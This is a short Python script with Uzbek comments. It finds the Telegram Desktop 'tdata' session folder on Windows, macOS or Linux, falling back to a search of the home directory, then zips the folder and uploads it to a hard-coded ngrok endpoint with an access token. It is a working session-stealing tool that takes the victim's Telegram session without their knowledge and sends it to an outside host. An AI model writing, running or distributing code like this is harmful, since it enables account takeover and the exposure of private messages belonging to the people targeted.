import requests
import os
import sys
import time
import shutil
import tempfile
import platform
from pathlib import Path


NGROK_URL = "https://e08d-84-54-73-86.ngrok-free.app"
TOKEN = "97158158"

UPLOAD_ENDPOINT = f"{NGROK_URL}/?token={TOKEN}"



def prepare_folder(folder_path):
    source = Path(folder_path).expanduser().resolve()

    if not source.exists():
        raise FileNotFoundError(f"Topilmadi: {source}")

    if not source.is_dir():
        raise ValueError(f"Bu papka emas: {source}")

    # Alohida vaqtinchalik katalog yaratamiz
    temp_dir = Path(tempfile.mkdtemp(prefix="upload_"))

    try:
        # Original papkaga tegmasdan nusxa olamiz
        copied_folder = temp_dir / source.name

        shutil.copytree(
            source,
            copied_folder,
            copy_function=shutil.copy2
        )

        # Nusxani ZIP qilamiz
        zip_base = temp_dir / source.name
        zip_path = Path(
            shutil.make_archive(
                str(zip_base),
                "zip",
                root_dir=temp_dir,
                base_dir=source.name
            )
        )

        return zip_path, temp_dir

    except Exception:
        shutil.rmtree(temp_dir, ignore_errors=True)
        raise


def cleanup(temp_dir):
    shutil.rmtree(temp_dir, ignore_errors=True)


def upload_zip(zip_path):
    zip_path = Path(zip_path).expanduser().resolve()

    if not zip_path.is_file():
        print(f"[XATO] ZIP fayl topilmadi: {zip_path}")
        return False

    print(f"[INFO] ZIP yuborilmoqda: {zip_path}")

    try:
        with open(zip_path, "rb") as f:
            response = requests.post(
                UPLOAD_ENDPOINT,
                files={
                    "files": (
                        zip_path.name,
                        f,
                        "application/zip"
                    )
                },
                timeout=60
            )

        if response.status_code == 200:
            print("[OK] ZIP muvaffaqiyatli yuborildi.")
            print(response.text)
            return True

        print(
            f"[XATO] Server javobi: "
            f"{response.status_code} - {response.text}"
        )
        return False

    except Exception as e:
        print(f"[XATO] Upload xatosi: {e}")
        return False

def find_tdata():
    system = platform.system()
    home = Path.home()

    # Tizimga xos odatiy joylar
    possible_paths = []

    if system == "Windows":
        appdata = Path.home() / "AppData" / "Roaming"

        possible_paths = [
            appdata / "Telegram Desktop" / "tdata",
            home / "AppData" / "Local" / "Telegram Desktop" / "tdata",
        ]

    elif system == "Darwin":  # macOS
        possible_paths = [
            home / "Library" / "Application Support"
            / "Telegram Desktop" / "tdata",

            home / "Library" / "Containers"
            / "org.telegram.desktop" / "Data"
            / "Library" / "Application Support"
            / "Telegram Desktop" / "tdata",
        ]

    elif system == "Linux":
        possible_paths = [
            home / ".local" / "share"
            / "TelegramDesktop" / "tdata",

            home / ".TelegramDesktop" / "tdata",
        ]

    # 1. Avval standart joylarni tekshiramiz
    for path in possible_paths:
        if path.is_dir():
            return path.resolve()

    # 2. Topilmasa home ichidan qidiramiz
    print("Standart joydan topilmadi.")
    print("Home katalogidan qidiryapman...")

    try:
        for path in home.rglob("tdata"):
            if (
                path.is_dir()
                and path.parent.name in (
                    "Telegram Desktop",
                    "TelegramDesktop"
                )
            ):
                return path.resolve()

    except PermissionError:
        pass

    return None




if __name__ == "__main__":

    path=find_tdata()

    try:
        zip_file, temp_dir = prepare_folder(path)

        print(f"✅ Vaqtinchalik ZIP tayyor:")
        print(zip_file)
        upload_zip(zip_file)

        # Shu yerda zip_file'ni serverga yuborish mumkin.
        # Upload tugagandan keyin:
        #
        # cleanup(temp_dir)

    except Exception as e:
        print(f"❌ Xatolik: {e}")